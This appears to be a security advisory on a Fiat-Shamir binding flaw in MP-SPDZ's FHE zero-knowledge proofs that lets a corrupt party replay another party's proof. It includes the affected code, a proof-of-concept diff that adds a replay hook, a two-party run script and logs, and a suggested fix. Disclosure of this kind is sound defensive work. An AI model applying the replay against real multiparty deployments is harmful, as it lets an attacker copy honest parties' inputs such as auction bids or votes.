# MP-SPDZ v0.4.3: Fiat-Shamir Challenge Not Bound to Prover/Session — Cross-Party Replay of FHE ZKPoK Proofs

- **Vulnerability type**: Insufficient Verification of Data Authenticity (CWE-345);
  Authentication Bypass by Capture-Replay (CWE-294)
- **Affected product**: MP-SPDZ v0.4.3 (vulnerable code identical in v0.4.1)
- **Affected components**: FHE-based malicious offline/input protocols (ChaiGear, and other
  `InputProducer`-based flows) — `FHEOffline/Proof.cpp`, `FHEOffline/Producer.cpp`,
  `FHEOffline/Verifier.cpp`, `Tools/octetStream.cpp`
- **Severity**: High (CVSS 3.1 estimate: 6.5 — AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N)

## Summary

In the FHE-based offline phase, every party proves with a zero-knowledge proof of knowledge
(ZKPoK) that its input ciphertexts encrypt known plaintexts. The Fiat-Shamir challenge is
derived by hashing **only the ciphertext bytes** — with an unkeyed 128-bit BLAKE2b and no
domain separator. The transcript binds neither the prover's party ID, nor any
session/sub-session ID, nor the FHE public key.

In `InputProducer::run`, all parties prove **sequentially** under the **same** global FHE
public key, and the verifier reads the statement ciphertexts from the untrusted proof stream
itself. A corrupt party that proves later can therefore forward an earlier party's proof
verbatim: the recomputed challenge is identical, every verification equation holds, and the
proof is accepted even though the replaying party does not know the plaintext — breaking
knowledge soundness and, downstream, the input-independence property of the SPDZ input
protocol.

## Root Cause

```cpp
// FHEOffline/Proof.cpp:36-42 — challenge = hash of the ciphertext stream ONLY
void Proof::set_challenge(const octetStream& ciphertexts)
{
  octetStream hash = ciphertexts.hash();
  PRNG G;
  assert(hash.get_length() >= SEED_SIZE);
  G.SetSeed(hash.get_data());
  set_challenge(G);
}
```

```cpp
// Tools/octetStream.cpp:95-102 — unkeyed BLAKE2b-128: no key, no label, no context
void octetStream::hash(octetStream& output) const
{
  output.resize(crypto_generichash_BYTES_MIN);          // = 16 bytes
  crypto_generichash(output.data, crypto_generichash_BYTES_MIN,
                     data, get_length(), NULL, 0);
  output.set_length(crypto_generichash_BYTES_MIN);
}
```

The challenge hash input contains nothing that varies per prover, per session, or per
protocol: no prover index, no sid/ssid, no public key, no domain separator. Hence the
challenge is a pure function of the ciphertext bytes: identical bytes always yield an
identical challenge.

Call flow (ChaiGear malicious-secure input production):

```
ChaiGearPrep::get_inputs()                     Protocols/ChaiGearPrep.hpp:196 (global setup.pk)
  → InputProducer<FD>::run(P, setup.pk, ...)   FHEOffline/Producer.cpp:545
     for j = 0 .. n-1  (sequential per-player loop):
       [party j]  personal_EC.generate_proof(...)         Producer.cpp:588
         → Prover::NIZKPoK → Proof::set_challenge(ciphertexts)   Proof.cpp:36
       [party j]  P.send_all(ciphertexts); P.send_all(cleartexts)
       [others]   Verifier<FD>(...).NIZKPoK(C, ciphertexts, cleartexts, pk)
                                                            Producer.cpp:597 (same pk for all)
         → Stage_2: c.unpack(ciphertexts, pk)              Verifier.cpp:70 (statement from stream)
     dd.reshare(ai, C[i], EC); ...                        Producer.cpp:609,615
       // "proven" ciphertexts become party j's MAC'd input shares
```

## Attack Preconditions / Trigger Conditions

- A deployment runs an FHE-based malicious offline/input protocol (e.g. `chaigear-party.x`),
  which uses `InputProducer::run` with one shared FHE public key for all parties; and
- the adversary controls a party `j2` that proves after the victim `j1` in the sequential loop
  (guaranteed to exist for at least one pair; with `player = -1` the loop covers all parties),
  or can inject a recorded transcript onto the wire (the default configuration uses
  unencrypted, unauthenticated channels — see MP-SPDZ-03's component analysis and this
  repository's networking findings).

## Impact

- **Knowledge soundness broken**: a party gets ciphertexts accepted as "proven" without
  knowing the plaintext — the exact property the ZKPoK exists to enforce.
- **Input independence violation**: the accepted ciphertexts are reshared and MAC'd as the
  replaying party's input shares. By additionally copying the victim's public adjustment
  message in the online phase (rushing), the adversary's effective input equals the victim's
  *unknown* input — e.g. copying an honest bid in a sealed auction or duplicating a vote.
  This violates the input-independence assumption of the SPDZ input protocol and voids the
  UC/malicious security argument for the produced input tuples.
- **Cross-session replay**: because no session identifier is bound, a transcript from a
  previous execution verifies in a later one (e.g. replaying a bid in a repeated auction).
  Over the default plaintext channels, a pure network attacker can inject such recorded
  transcripts without compromising any host.

## Proof of Concept (dynamically verified)

The test below mimics on the wire exactly what a corrupt party may send under the
malicious-security threat model. It adds an environment-gated test hook to
`FHEOffline/Producer.cpp` that makes one party forward the previously received proof
transcript instead of generating its own, plus a log line printing the transcript hash on
every accepted proof. Honest-party code paths are bit-identical when the hook is disabled.

```diff
--- a/FHEOffline/Producer.cpp
+++ b/FHEOffline/Producer.cpp
@@
         AddableVector<Ciphertext> C;
         vector<Plaintext_<FD>> m(personal_EC.proof.U, FieldD);
+        static octetStream replay_ct, replay_pt;   // test hook, env-gated
+        bool test_replay = getenv("TEST_REPLAY")
+                           and P.my_num() == atoi(getenv("TEST_REPLAY"));
         if (j == P.my_num())
         {
+            if (test_replay and replay_ct.get_length() > 0)
+            {
+                ciphertexts = replay_ct;   // forward, do not generate
+                cleartexts  = replay_pt;
+                P.send_all(ciphertexts);
+                P.send_all(cleartexts);
+                C.resize(personal_EC.machine->sec, pk.get_params());
+                Verifier<FD>(personal_EC.proof, FieldD).NIZKPoK(C,
+                        ciphertexts, cleartexts, pk);
+            }
+            else
+            {
                 for (auto& x : m)
                     x.randomize(G);
                 personal_EC.generate_proof(C, m, ciphertexts, cleartexts);
                 P.send_all(ciphertexts);
                 P.send_all(cleartexts);
+            }
         }
         else
         {
             P.receive_player(j, ciphertexts);
             P.receive_player(j, cleartexts);
+            if (test_replay and replay_ct.get_length() == 0)
+                { replay_ct = ciphertexts; replay_pt = cleartexts; }
             C.resize(personal_EC.machine->sec, pk.get_params());
             Verifier<FD>(personal_EC.proof, FieldD).NIZKPoK(C, ciphertexts,
                     cleartexts, pk);
+            cerr << "[test] party " << P.my_num() << " accepted proof from party "
+                 << j << " with transcript hash " << ciphertexts.hash() << endl;
         }
```

Test program (`test_replay.mpc`):

```
a = sint.get_input_from(0)
b = sint.get_input_from(1)
print_ln("sum=%s", (a + b).reveal())
```

Run (two parties, ChaiGear):

```bash
mkdir -p Player-Data
echo 100 > Player-Data/Input-P0-0
echo 300 > Player-Data/Input-P1-0
./chaigear-party.x -IF Player-Data/Input -N 2 -pn 19500 -h 127.0.0.1 0 test_replay &
sleep 6   # let party 0's embedded coordination server listen
TEST_REPLAY=1 ./chaigear-party.x -IF Player-Data/Input -N 2 -pn 19500 -h 127.0.0.1 1 test_replay &
wait
```

**Observed output (verbatim logs, party 1 = replaying party):**

```
party 1: [test] party 1 accepted proof from party 0 with transcript hash c92bda896787068e23004e3554054513
party 1: (forwards the captured 63706832-byte transcript as its own)
party 0: [test] party 0 accepted proof from party 1 with transcript hash c92bda896787068e23004e3554054513
party 0: sum=46007042181262213913711961233286801104   # garbage (not 400)
```

The transcript hash that party 0 accepts as "party 1's proof" is **byte-identical** to party
0's own earlier proof — the verifier accepted a verbatim replay from a party that never knew
the encrypted plaintext.

**Control**: without `TEST_REPLAY`, the two proofs' hashes differ and the program outputs the
correct `sum=400`. The replayed run's garbage sum confirms the replaying party did not know
the mask plaintext (knowledge soundness failure), while verification still passed.

Note for reproduction: use the default (SoftSpokenOT/libOTe) build. With `USE_KOS=1`,
preprocessing crashes before reaching this code due to an unrelated issue —
`TwoPartyPlayer` does not implement `partial_broadcast` (`Networking/Player.h`,
`throw not_implemented()`), hit via `GlobalPRNG -> Create_Random_Seed` inside the KOS
correlation check; that crash is a separate robustness bug.

## Static Verification

```bash
sed -n 36,42p FHEOffline/Proof.cpp      # challenge = hash(ciphertexts) only
sed -n 95,102p Tools/octetStream.cpp    # unkeyed BLAKE2b, 16-byte digest, NULL key
sed -n 580,600p FHEOffline/Producer.cpp # sequential loop; single shared pk; verifier
                                        #   takes statement from the untrusted stream
grep -n "generate_challenge\|set_challenge" FHEOffline/Prover.cpp FHEOffline/Verifier.cpp
```

The weakness is provable without execution: the challenge is a deterministic pure function of
the ciphertext bytes, so a forwarded byte string necessarily reproduces the original
challenge and satisfies every verification equation that held for the original prover.

## Suggested Fix

Bind the full context into the challenge, and use a 256-bit digest:

```
challenge = H("mpspdz-zkpopk" || sid || prover_id || pk_bytes || ciphertexts)
```

- `prover_id`: makes a forwarded transcript yield a different challenge at the verifier,
  which then fails the equations (blocks cross-party replay);
- `sid` (derived from setup/transcript/participant set): blocks cross-session replay;
- domain separator and `pk_bytes`: blocks cross-protocol/cross-key confusion;
- `crypto_generichash_BYTES` (32 bytes) instead of `crypto_generichash_BYTES_MIN` (16 bytes),
  bringing binding strength in line with the framework's 128-bit computational security
  target (see also the commitment-hash usage in `Tools/Commit.cpp`, which shares this
  128-bit digest weakness);
- where the caller already knows the expected statement, the verifier should hash its own
  copy of the statement rather than only the received stream.

## References

- MP-SPDZ repository: https://github.com/data61/MP-SPDZ
- Upstream issue report: *(link to be added after filing)*

## Discoverer

*(to be filled by reporter)*
